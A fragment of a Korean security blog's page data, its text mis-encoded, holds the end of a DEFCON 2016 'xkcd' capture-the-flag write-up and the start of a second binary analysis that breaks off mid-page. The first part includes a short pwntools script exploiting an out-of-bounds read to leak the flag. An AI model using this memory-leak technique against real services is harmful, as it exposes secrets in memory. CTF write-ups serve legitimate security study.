aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>í•´ê²° ë°©ì•ˆ</h1>\n<h2 id=\"ê³µê²©\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"ê³µê²© permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ê³µê²©</h2>\n<ul>\n<li>ì–´ë–»ê²Œ í•´ë‹¹ flag ë¬¸ìì—´ ê°’ì„ ì½ì–´ì˜¬ ìˆ˜ ìˆì„ê¹Œ?</li>\n<li><code class=\"language-text\">globals</code>, <code class=\"language-text\">flag</code> ì „ì—­ ë³€ìˆ˜ëŠ” ê°™ì€ .bss ì„¹ì…˜ì— ì¡´ì¬í•˜ë©° <code class=\"language-text\">globals</code> ë³€ìˆ˜ë¥¼ ê¸°ì¤€ìœ¼ë¡œ 0x200 ë°”ì´íŠ¸ ì°¨ì´ê°€ ë‚œë‹¤.</li>\n<li>ë§Œì•½ì— ì‚¬ìš©ìê°€ 0x200 ë°”ì´íŠ¸ ì´ìƒì˜ ê°’ì„ ì…ë ¥í•˜ê²Œ ëœë‹¤ë©´ í•´ë‹¹ ê°’ì€ <code class=\"language-text\">flag</code> ì „ì—­ ë³€ìˆ˜ì™€ ë¶™ê²Œ ë  ê²ƒì´ê³  ë„ê°’ì´ ì¡´ì¬ í•˜ì§€ ì•Šê²Œë˜ <code class=\"language-text\">streln</code> ì€ í•´ë‹¹ ê¸¸ì´ ê²€ì‚¬ë¥¼ í• ë•Œ ë„ ê°’ì„ í™•ì¸í•  ìˆ˜ ì—†ì–´ <code class=\"language-text\">flag</code> ë³€ìˆ˜ì˜ ë„ ê¹Œì§€ ì½ê²Œ ë˜ì–´ <code class=\"language-text\">globals+flag</code> ê¸¸ì´ë¥¼ ì¸¡ì í•˜ê²Œ ë  ê²ƒì´ë‹¤.</li>\n<li>ê·¸ë ‡ê²Œ ë˜ë©´ <code class=\"language-text\">out-of-bound read</code> ì·¨ì•½ì ì´ ë°œìƒí•  ê²ƒì´ë‹¤.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\ne <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\nflag <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./xkcd\"</span><span class=\"token punctuation\">)</span>\n    data <span class=\"token operator\">=</span> <span class=\"token string\">'SERVER, ARE YOU STILL THERE? IF SO, REPLY \"%s\" (%d)'</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">512</span><span class=\"token punctuation\">,</span> <span class=\"token number\">512</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>    \n    <span class=\"token keyword\">print</span> p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 708px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0ElEQVQY03XLS06EMAAA0F5EYZiW0s/0Q2lLKVBgyEQnk6gLo66NGu9/AReum7ztA+N668dHHx/66Wr8GfNediuTozSL6fcKd4fa5IBhTl0Y7TC5OIvWVpgSoRE9EaGYakuEC1jngJg2OyQXFz9t2sVjw6k0mCsiDFO2RKSATQ6Iy+6G9T/bkCARXLuGt0w5YfoSsQLSHBCmwQTfBW9jMN5VGBFxqikhgnMt72F1dzzkgPPld1q+5u077T9j+qTiRXXvQr8q89baD8KfG/aU8weMZ0JAWbOJmQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png\"\n        srcset=\"/static/b547b166c5b8f537383938fe8538dfef/e9ff0/8.png 180w,\n/static/b547b166c5b8f537383938fe8538dfef/f21e7/8.png 360w,\n/static/b547b166c5b8f537383938fe8538dfef/3cb0f/8.png 708w\"\n        sizes=\"(max-width: 708px) 100vw, 708px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"flag\" style=\"position:relative;\"><a href=\"#flag\" aria-label=\"flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>flag</h2>\n<ul>\n<li>flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.</li>\n</ul>","frontmatter":{"date":"September 18, 2020","title":"DEFCON 2016 xkcd ì·¨ì•½ì  ë¶„ì„","categories":"CTF","author":"Zer0Luck","emoji":"ğŸ§»"},"fields":{"slug":"/defcon2016_xkcd_ctf_writeup/"}},"prev":{"id":"527f840c-3346-5966-bbdf-58f7eb6e73ab","html":"<h1 id=\"ì·¨ì•½ì -ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"ì·¨ì•½ì  ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì·¨ì•½ì  ë¶„ì„</h1>\n<h2 id=\"ë°”ì´ë„ˆë¦¬-ê°œìš”\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"ë°”ì´ë„ˆë¦¬ ê°œìš” permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë°”ì´ë„ˆë¦¬ ê°œìš”</h2>\n<h3 id=\"ë³´í˜¸ê¸°ë²•\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"ë³´í˜¸ê¸°ë²• permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë³´í˜¸ê¸°ë²•</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 631px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 15.555555555555555%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAW0lEQVQI12MId4nyMnM007f1s/d3NbBXVTVWVDNRIoyMldUtGTwCorWMjBVUNfRNdE2MdVVU1eRU1OQJI1UFVW0GV49QJTVNRQ1tKXdLKWtjORUNeaKQuoKqLgBhEh2r6vm61AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/a636dbdc556a047761b1872da2658275/4597d/0.png\"\n        srcset=\"/static/a636dbdc556a047761b1872da2658275/e9ff0/0.png 180w,\n/static/a636dbdc556a047761b1872da2658275/f21e7/0.png 360w,\n/static/a636dbdc556a047761b1872da2658275/4597d/0.png 631w\"\n        sizes=\"(max-width: 631px) 100vw, 631px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ë³´í˜¸ê¸°ë²•</p>\n<ul>\n<li>NX</li>\n<li>PIE</li>\n<li>RELRO</li>\n</ul>\n<h3 id=\"ë°”ì´ë„ˆë¦¬-ì •ë³´\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\" aria-label=\"ë°”ì´ë„ˆë¦¬ ì •ë³´ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë°”ì´ë„ˆë¦¬ ì •ë³´</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">gissa_igen<span class=\"token punctuation\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared <span class=\"token builtin\">object</span>\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>734a8aeeff274eb59ee3c7ac733056d95b41e80f\nstripped</code></pre></div>\n<h2 id=\"ë°”ì´ë„ˆë¦¬-ë¶„ì„\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"ë°”ì´ë„ˆë¦¬ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2>\n<p><strong>ë©”ì¸ ì¶œë ¥</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABbklEQVQY02Ow9UiwC8y2900x90y1cI2y9koyc421cou08km3cA41cYmxcA4zdY1TNXTRtvTXMPdTVDdSVNNXVDNQVDNgMCvaZVS4VT+m16z8gH7iDIvGC/oZy8wrDhoVbjfJXWfZets4e7VZ+X7T0r0mmUutO+6pmLrLKcjLq2rKq6gzGJUcMa49pxMz2ah4j1ZYh1HtZeOKY/r5O0zqr5hUntDP2WhSecK05a52VI+6f7VO+gqINnkVTXkVDQb92KkG6Yv0YicaZizTj+41TF+oF92jHdGtmzBLM6he1S5SK6xdN3Wxhm+pqmOCinWwnLycvKqWvIoGSLOBsZWeoaGapra6praOnqGWjr6mtq6sgpKsgqKcopKckrociK0kp6Qip6Qqp6wGsROq2cktwNbJTUPXSE5FQ1ZJXU4ZhEBugyAVDRQ2KmJwdPOztHNydPXS1DMCacNQgQcxuHgG2Tm7O7n7aOkbyyqpkaQZAIpSdXbQ5Kp0AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/53855baa56ab5c7215d0d1e075b65838/37523/1.png\"\n        srcset=\"/static/53855baa56ab5c7215d0d1e075b65838/e9ff0/1.png 180w,\n/static/53855baa56ab5c7215d0d1e075b65838/f21e7/1.png 360w,\n/static/53855baa56ab5c7215d0d1e075b65838/37523/1.png 720w,\n/static/53855baa56ab5c7215d0d1e075b65838/4e6ec/1.png 827w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>ë©”ì¸ ì¶œë ¥ ë¶€ë¶„</p>\n<ul>\n<li>ë°”ì´ë„ˆë¦¬ë¥¼ ë™ì‘í•  ê²½ìš° <code class=\"language-text\">flag (1/3)</code> ë¬¸ìì—´ì„ ì¶œë ¥í•˜ë©´ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ ê°’ì„ ë°›ê¸° ìœ„í•´ ëŒ€ê¸° ìƒíƒœì— ìˆëŠ”ë‹¤.</li>\n<li>ì‚¬ìš©ìê°€ ì…ë ¥ì„ í•  ê²½ìš° ë§Œì•½ ê³µë°±ì´ë©´ <code class=\"language-text\">try again</code> ë¬¸ìì—´ì„ ì¶œë ¥í•˜ë©´ì„œ ì¬ ì…ë ¥ì„ í•œë©° ì¹´ìš´í„°ê°€ ì¦ê°€í•˜ì§€ ì•ŠëŠ”ë‹¤.</li>\n<li>ì‚¬ìš©ìê°€ ì…ë ¥ì„ í•  ê²½ìš° ë§Œì•½ ì…ë ¥ ê°’ì´ì¡´ì¬ í•œë‹¤ë©´ ì–´ë–¤ ë¡œì§ì„ ë°”íƒ•ìœ¼ë¡œ ê²€ì¦ì„ í•˜ì—¬ í‹€ë¦¬ê²Œ ë˜ë©´ <code class=\"language-text\">is not right</code> ë¬¸ìì—´ì„ ì¶œë ¥í•˜ë©´ì„œ ì¹´ìš´í„°ê°€ ì¦ê°€ í•œë‹¤.</li>\n</ul>\n<p><strong>system call ì¶”ì </strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAABl0lEQVQY0xXCzW6UQAAAYF6kLAsDw/CzA0sFygrLALPDLAtL3Z/gT0w0NW2aTVsTW7OJxhdQD3rSGBPTePCgNx/A9GZivPhAZr98wnz9aDpf0WqZsXlEWBDTlDZ5eTgiPMmrMKHRuAzi4tYow14EdCyplqiYewrQjEpYrO/V7SGb1pTxYlIyztl0VnJeTCZxSjw/8MPQ8wPHj/B+4PoHBh5qJu5rwBjMhOLsenz0lmw+J0/e3T75mG8+xScfsrMv2fl1dPQ+ePhmtPlq5/eBBjXL1UwMLQytYR9qxqAW3Od/rNMfzvlP+/ibu/3tXN4MX/x1rm6cy1/eq3+oe22ffpf3mSjJItBFBYoy3Nvtq6gUhsuX9vyZ0W716gLVT2G50ZsrmHQ6eYDaLRzfBQd1TwEiQCLQeyrqASQBQ1RkaHBhseqqWUXSlGZ5QbLdNM1JHoWRhx0Xu7Y5cFwfY09VkQxgb1cXFUkzSqFePC6bjrNlw9ZTeqflXUWXNVvxvM3iiow4TarJuOZZkwQFtkIJDGTVlQDSzeY/+ftuAgWA3t4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/2b6dea829e551bf0ea742d12b98c25de/37523/2.png\"\n        srcset=\"/static/2b6dea829e551bf0ea742d12b98c25de/e9ff0/2.png 180w,\n/static/2b6dea829e551bf0ea742d12b98c25de/f21e7/2.png 360w,\n/static/2b6dea829e551bf0ea742d12b98c25de/37523/2.png 720w,\n/static/2b6dea829e551bf0ea742d12b98c25de/eba85/2.png 1054w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>strace</p>\n<ul>\n<li>system callì„ ì¶”ì í•œ ê²°ê³¼ <code class=\"language-text\">stat</code> í•¨ìˆ˜ê°€ â€˜/home/ctf/flagâ€™ íŒŒì¼ì˜ ìƒíƒœ ì—¬ë¶€ì™€ <code class=\"language-text\">open</code> í•¨ìˆ˜ë¥¼ ë°”íƒ•ìœ¼ë¡œ ì½ê¸° ì „ìš©ìœ¼ë¡œ ë°ì´í„°ë¥¼ ì½ì–´ì˜¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</li>\n<li>ë°‘ ë¶„ì„ ì˜ ë³´ë©´ <code class=\"language-text\">prctl</code> í•¨ìˆ˜ì˜ ì¸ìë¡œ <code class=\"language-text\">PR_SET_SECCOMP</code> ì„ ì „ë‹¬í•˜ì—¬ seccom ë³´í˜¸ ê¸°ë²•ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° <code class=\"language-text\">SECCOMP_MODE_FILTER</code> ëª¨ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ë¸”ë™ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ìœ¼ë¡œ ì ‘ê·¼ì œì–´ë¥¼ í•˜ê³  ìˆë‹¤.</li>\n</ul>\n<h2 id=\"seccomp_mode_filter-list\" style=\"position:relative;\"><a href=\"#seccomp_mode_filter-list\" aria-label=\"seccomp_mode_filter list permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SECCOMP_MODE_FILTER LIST</h2>\n<ul>\n<li>david942j ê°œë°œí•œ seccomp-toolsë¥¼ í™œìš©í•˜ì—¬ ë¸”ë™ë¦¬ìŠ¤íŠ¸ë¥¼ í™•ì¸í•˜ì˜€ë‹¤.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAACJUlEQVQoz3XPXW/SUADGcb4Ip6VvtJQC9tCe0lJoT2mBFmnZYMIGwU3YpiHGJczojJFrNVmMiYneLLuYicnUO0183c3udqX7QMYlS5C45H/7y5MnhsZHaPoN9ve1nc9w/bW+dyqPDo3p1/zkozZ5rz8+U8YH2u5PODrQ75/A7bcESZFclmAFmtdj8O4XZfY73X8B730Se8/g7BzunuSmP/JPfsEHp/L0e/7RGZydc7WJdPuYDx8CAhCsABiGSqoxsfM0O/kgrr1Mj49Svf301juh+1y8+SY9OuTDPRZviINXmTvHnD3kG1NSkAmKJRgBMCyVRDHNsA1DKxiGoioKQloBcRxHMwxJggRNJxiOJElAAJCgAZkgGP6iS2xXW6VKzQ2iShD6rU57bajoZcP2jDKWEZKgIslIyEBA8wSbWsSu38ZVP4ja9eZS2OkNbm0i0y7hql51JKjm8gVGkOIUd8kWlr2o5Hiu33RqjXq41F4dKHrJtL1cWZNUVdHLQkYGdPL/eH45Wun1N8bItGzXh46RUZGilzgxeyU2cWBi1w3mlo2/y1kTiSqUVePi8BUYey3sBUHUqTWXo5XVwfqmZmKrEkCnKGlI1S0hA+MUTzCpuUTAJKmkFis5dRPbbhA49Zofhcu9br5QKFp2zlIELZPLK5IsA5r+NyZOkwlOjmFv5FSH9etbtcY4CLfb3Z2i1cPuULdvCNATc3Xpms8JmF3M4sXwD91dseYEXE+xAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/48f1fad9731c6cae39260260a3e21d49/37523/3.png\"\n        srcset=\"/static/48f1fad9731c6cae39260260a3e21d49/e9ff0/3.png 180w,\n/static/48f1fad9731c6cae39260260a3e21d49/f21e7/3.png 360w,\n/static/48f1fad9731c6cae39260260a3e21d49/37523/3.png 720w,\n/static/48f1fad9731c6cae39260260a3e21d49/a1dd2/3.png 838w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>SECCOMP_MODE_FILTER LIST</p>\n<ul>\n<li>ë¸”ë™ë¦¬ìŠ¤íŠ¸ ê¸°ë°˜ìœ¼ë¡œ ì°¨ë‹¨ëœ ë¦¬ìŠ¤íŠ¸ë¥¼ í™•ì¸í•œ ê²°ê³¼ <code class=\"language-text\">open</code>, <code class=\"language-text\">clone</code>, <code class=\"language-text\">fork</code>, <code class=\"language-text\">vfork</code>, <code class=\"language-text\">execve</code>, <code class=\"language-text\">creat</code>, <code class=\"language-text\">execveat</code> í•¨ìˆ˜ê°€ ì°¨ë‹¨ë˜ì–´ ë°”ì´ë„ˆë¦¬ìƒì—ì„œ  í˜¸ì¶œì´ ë¶ˆê°€ëŠ¥í•˜ë‹¤.</li>\n</ul>\n<h2 id=\"main-í•¨ìˆ˜-ë¶„ì„\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main í•¨ìˆ˜ ë¶„ì„ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main í•¨ìˆ˜ ë¶„ì„</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 54.44444444444444%; position: relative; bottom: 0; left: 0; background-image: 